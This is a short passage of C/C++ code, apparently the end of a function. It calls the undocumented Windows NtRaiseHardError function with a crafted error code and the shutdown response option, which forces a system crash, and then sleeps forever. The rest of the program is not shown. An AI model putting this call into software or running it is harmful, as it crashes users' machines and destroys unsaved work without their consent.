        NtRaiseHardError((LONG)0xC1248163, 0, 0, nullptr, 6, &response);
    }
    Sleep(-1);
} 
